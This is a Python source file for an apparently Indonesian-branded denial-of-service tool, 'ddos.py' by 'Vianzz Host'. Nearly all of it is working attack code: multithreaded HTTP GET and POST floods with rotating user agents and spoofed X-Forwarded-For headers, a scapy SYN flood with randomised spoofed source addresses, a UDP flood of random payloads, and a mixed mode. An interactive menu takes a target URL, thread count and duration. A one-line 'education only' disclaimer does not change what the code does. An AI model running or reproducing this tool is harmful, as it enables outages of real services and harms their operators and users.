#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ddos.py - Main DDoS Tool
# Version: 2.0 | Developer: Vianzz Host

import sys
import os
import time
import random
import string
import threading
import socket
import ssl
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

# Auto-install dependencies
try:
    import requests
    from requests.adapters import HTTPAdapter
except ImportError:
    os.system("pip install requests")
    import requests

try:
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
except ImportError:
    os.system("pip install colorama")
    from colorama import init, Fore, Style, Back
    init(autoreset=True)

try:
    from scapy.all import IP, TCP, send, RandIP, RandShort
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# ---------------------------------------------------------------------
# BANNER VIANZZ HOST (YANG DIMINTA)
# ---------------------------------------------------------------------
BANNER = f"""
{Fore.RED} _    _______ ___    _   _ _____ _____ 
{Fore.RED}| |  / /_  _//   |  / | / /__  //__  / 
{Fore.RED}| | / / / / / /| | /  |/ /  / /   / /  
{Fore.RED}| |/ /_/ /_/ ___ |/ /|  /  / /__ / /__ 
{Fore.RED}|___/_____/_/  |_/_/ |_/  /____//____/ 
{Fore.RED}          _   _ _____ _____ _____ 
{Fore.RED}         | | | /  _  // ___//_  _/ 
{Fore.RED}         | |_| / / / /___ \\   / /   
{Fore.RED}         |  _  / /_/ /____/  / /    
{Fore.RED}         |_| |_|____/_____/  /_/    
{Fore.RED}                                     
{Fore.YELLOW}╔═══════════════════════════════════════════════════╗
{Fore.YELLOW}║  {Fore.CYAN}DEVELOPER : {Fore.WHITE}Vianzz Host                          {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.CYAN}VERSION   : {Fore.WHITE}2.0                                 {Fore.YELLOW}║
{Fore.YELLOW}║  {Fore.CYAN}STATUS    : {Fore.GREEN}ACTIVE                              {Fore.YELLOW}║
{Fore.YELLOW}╚═══════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""

# ---------------------------------------------------------------------
# KONFIGURASI
# ---------------------------------------------------------------------
MAX_THREADS = 300
SOCKET_TIMEOUT = 3
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A205F) AppleWebKit/537.36",
]
REFERERS = [
    "https://google.com/",
    "https://bing.com/",
    "https://yahoo.com/",
    "https://duckduckgo.com/",
    "https://facebook.com/",
    "https://twitter.com/",
    "",
]

# ---------------------------------------------------------------------
# KELAS ATTACK
# ---------------------------------------------------------------------
class AttackEngine:
    def __init__(self, target_url, threads=150, duration=60, method="http"):
        self.target_url = target_url.rstrip("/")
        self.parsed = urlparse(target_url)
        self.host = self.parsed.netloc
        self.path = self.parsed.path or "/"
        self.scheme = self.parsed.scheme
        self.threads = min(threads, MAX_THREADS)
        self.duration = duration
        self.method = method.lower()
        self.running = True
        self.attack_count = 0
        self.success_count = 0
        self.fail_count = 0
        self.lock = threading.Lock()
        self.start_time = 0
        
    def _get_session(self):
        session = requests.Session()
        session.verify = False
        return session

    def _http_attack(self, thread_id):
        session = self._get_session()
        while self.running:
            try:
                ua = random.choice(USER_AGENTS)
                ref = random.choice(REFERERS)
                headers = {
                    "User-Agent": ua,
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Connection": "keep-alive",
                    "Referer": ref,
                    "Cache-Control": "no-cache",
                    "Pragma": "no-cache",
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                }
                
                rand_param = f"?{random.randint(1,999999)}"
                url = self.target_url + rand_param
                
                if self.method == "post":
                    payload = {
                        "data": "".join(random.choices(string.ascii_letters, k=512)),
                        "random": random.randint(1,999999)
                    }
                    resp = session.post(url, headers=headers, data=payload, timeout=SOCKET_TIMEOUT)
                else:
                    resp = session.get(url, headers=headers, timeout=SOCKET_TIMEOUT)
                
                with self.lock:
                    self.attack_count += 1
                    if resp.status_code < 400:
                        self.success_count += 1
                    else:
                        self.fail_count += 1
                        
            except Exception:
                with self.lock:
                    self.fail_count += 1
                pass
            time.sleep(random.uniform(0.001, 0.005))

    def _syn_attack(self, thread_id):
        if not SCAPY_AVAILABLE:
            return
        try:
            target_ip = socket.gethostbyname(self.host)
        except:
            return
        target_port = 443 if self.scheme == "https" else 80
        
        while self.running:
            try:
                ip_layer = IP(src=RandIP(), dst=target_ip)
                tcp_layer = TCP(
                    sport=RandShort(), 
                    dport=target_port, 
                    flags="S", 
                    seq=random.randint(1000, 999999),
                    window=random.randint(1024, 65535)
                )
                send(ip_layer/tcp_layer, verbose=0)
                with self.lock:
                    self.attack_count += 1
                    self.success_count += 1
            except Exception:
                with self.lock:
                    self.fail_count += 1
                pass
            time.sleep(random.uniform(0.0001, 0.001))

    def _udp_attack(self, thread_id):
        try:
            target_ip = socket.gethostbyname(self.host)
        except:
            return
        target_port = 443 if self.scheme == "https" else 80
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self.running:
            try:
                data = os.urandom(random.randint(1024, 65507))
                sock.sendto(data, (target_ip, target_port))
                with self.lock:
                    self.attack_count += 1
                    self.success_count += 1
            except Exception:
                with self.lock:
                    self.fail_count += 1
                pass
            time.sleep(random.uniform(0.0001, 0.0005))

    def start(self):
        self.start_time = time.time()
        print(f"{Fore.GREEN}[+] Memulai serangan {self.method.upper()} ke {self.target_url}")
        print(f"{Fore.YELLOW}[+] Thread: {self.threads} | Durasi: {self.duration} detik")
        print(f"{Fore.CYAN}[+] Tekan Ctrl+C untuk menghentikan{Style.RESET_ALL}\n")
        
        executor = ThreadPoolExecutor(max_workers=self.threads)
        
        if self.method == "syn":
            attack_func = self._syn_attack
        elif self.method == "udp":
            attack_func = self._udp_attack
        else:
            attack_func = self._http_attack
            
        for i in range(self.threads):
            executor.submit(attack_func, i)
            
        # Progress monitor
        try:
            while self.running and (time.time() - self.start_time < self.duration):
                elapsed = int(time.time() - self.start_time)
                remaining = max(0, self.duration - elapsed)
                print(f"\r{Fore.CYAN}[+] Paket: {self.attack_count} | Berhasil: {self.success_count} | Gagal: {self.fail_count} | Sisa: {remaining}s  ", end="")
                sys.stdout.flush()
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Dihentikan oleh user")
        finally:
            self.running = False
            executor.shutdown(wait=True)
            print(f"\n\n{Fore.GREEN}╔═══════════════════════════════════════════╗")
            print(f"{Fore.GREEN}║  {Fore.WHITE}STATISTIK SERANGAN                    {Fore.GREEN}║")
            print(f"{Fore.GREEN}╠═══════════════════════════════════════════╣")
            print(f"{Fore.GREEN}║  {Fore.CYAN}Total Paket   : {Fore.WHITE}{self.attack_count:<10}          {Fore.GREEN}║")
            print(f"{Fore.GREEN}║  {Fore.CYAN}Berhasil      : {Fore.WHITE}{self.success_count:<10}          {Fore.GREEN}║")
            print(f"{Fore.GREEN}║  {Fore.CYAN}Gagal         : {Fore.WHITE}{self.fail_count:<10}          {Fore.GREEN}║")
            print(f"{Fore.GREEN}║  {Fore.CYAN}Durasi        : {Fore.WHITE}{int(time.time() - self.start_time)} detik     {Fore.GREEN}║")
            print(f"{Fore.GREEN}╚═══════════════════════════════════════════╝{Style.RESET_ALL}")

# ---------------------------------------------------------------------
# MENU SYSTEM
# ---------------------------------------------------------------------
def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")

def show_banner():
    print(BANNER)

def show_menu():
    clear_screen()
    show_banner()
    print(f"""
{Fore.GREEN}[1] {Fore.WHITE}HTTP GET Flood - Serangan GET biasa
{Fore.GREEN}[2] {Fore.WHITE}HTTP POST Flood - Serangan POST dengan payload
{Fore.GREEN}[3] {Fore.WHITE}SYN Flood     - Serangan SYN (butuh root)
{Fore.GREEN}[4] {Fore.WHITE}UDP Flood     - Serangan UDP (butuh root)
{Fore.GREEN}[5] {Fore.WHITE}Mixed Attack  - Kombinasi GET + SYN
{Fore.GREEN}[6] {Fore.WHITE}Tentang Tools
{Fore.GREEN}[0] {Fore.RED}Keluar
{Style.RESET_ALL}
""")

def get_input(prompt):
    return input(f"{Fore.CYAN}{prompt}{Style.RESET_ALL}").strip()

def about_tools():
    clear_screen()
    show_banner()
    print(f"""
{Fore.WHITE}╔═══════════════════════════════════════════════════════╗
{Fore.WHITE}║  {Fore.YELLOW}DDOS TOOL - VIANZZ HOST                    {Fore.WHITE}║
{Fore.WHITE}║                                                       ║
{Fore.WHITE}║  {Fore.CYAN}Developer   : {Fore.WHITE}Vianzz Host                    {Fore.WHITE}║
{Fore.WHITE}║  {Fore.CYAN}Version     : {Fore.WHITE}2.0                           {Fore.WHITE}║
{Fore.WHITE}║  {Fore.CYAN}Platform    : {Fore.WHITE}Termux / Linux / Android      {Fore.WHITE}║
{Fore.WHITE}║  {Fore.CYAN}Bahasa      : {Fore.WHITE}Python 3                      {Fore.WHITE}║
{Fore.WHITE}║                                                       ║
{Fore.WHITE}║  {Fore.RED}⚠️  PERINGATAN PENTING:                     {Fore.WHITE}║
{Fore.WHITE}║  {Fore.RED}Tools ini hanya untuk testing dan edukasi   {Fore.WHITE}║
{Fore.WHITE}║  {Fore.RED}Gunakan hanya pada server yang anda miliki  {Fore.WHITE}║
{Fore.WHITE}║  {Fore.RED}atau yang sudah mendapat izin resmi.        {Fore.WHITE}║
{Fore.WHITE}║  {Fore.RED}Penggunaan ilegal adalah tindak pidana.     {Fore.WHITE}║
{Fore.WHITE}╚═══════════════════════════════════════════════════════╝
{Style.RESET_ALL}
""")
    input(f"{Fore.CYAN}Tekan Enter untuk kembali...{Style.RESET_ALL}")

def run_attack():
    while True:
        show_menu()
        choice = get_input("Pilih menu (0-6): ")
        
        if choice == "0":
            print(f"{Fore.RED}Keluar dari tools...")
            sys.exit(0)
        elif choice == "6":
            about_tools()
            continue
        
        url = get_input("Masukkan target URL (contoh: https://example.com): ")
        if not url.startswith(("http://", "https://")):
            url = "http://" + url
        
        try:
            threads = int(get_input("Jumlah thread (default 150, max 300): ") or "150")
            threads = min(max(threads, 10), MAX_THREADS)
        except ValueError:
            threads = 150
        
        try:
            duration = int(get_input("Durasi serangan dalam detik (default 60): ") or "60")
            duration = max(duration, 5)
        except ValueError:
            duration = 60
        
        method_map = {
            "1": "get",
            "2": "post",
            "3": "syn",
            "4": "udp",
            "5": "mixed"
        }
        method = method_map.get(choice, "get")
        
        print(f"{Fore.YELLOW}[!] Serangan akan dimulai dalam 3 detik... (Ctrl+C untuk batal)")
        time.sleep(3)
        
        try:
            if method == "mixed":
                half = threads // 2
                print(f"{Fore.CYAN}[+] Mode mixed: {half} HTTP + {half} SYN thread")
                attack1 = AttackEngine(url, threads=half, duration=duration, method="get")
                attack2 = AttackEngine(url, threads=half, duration=duration, method="syn")
                
                t1 = threading.Thread(target=attack1.start)
                t2 = threading.Thread(target=attack2.start)
                t1.start()
                t2.start()
                t1.join()
                t2.join()
            else:
                attack = AttackEngine(url, threads=threads, duration=duration, method=method)
                attack.start()
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Serangan dibatalkan")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
        
        input(f"\n{Fore.CYAN}Tekan Enter untuk kembali ke menu...{Style.RESET_ALL}")

# ---------------------------------------------------------------------
# MAIN
# ---------------------------------------------------------------------
def main():
    try:
        if not SCAPY_AVAILABLE:
            print(f"{Fore.YELLOW}[!] Scapy tidak terinstall. SYN dan UDP flood dinonaktifkan.")
            print(f"{Fore.YELLOW}[!] Install dengan: pip install scapy{Style.RESET_ALL}")
        
        run_attack()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Tools dihentikan...")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[!] Error fatal: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
